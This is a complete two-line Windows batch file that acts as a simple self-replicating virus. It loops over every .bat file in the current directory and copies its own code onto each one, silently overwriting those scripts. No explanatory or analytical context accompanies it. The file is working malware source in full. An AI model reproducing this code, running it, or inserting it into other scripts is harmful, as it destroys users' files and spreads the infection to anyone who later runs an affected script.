@echo off
for %%b in (*.bat) do copy %0.bat+%0 %%b>nul
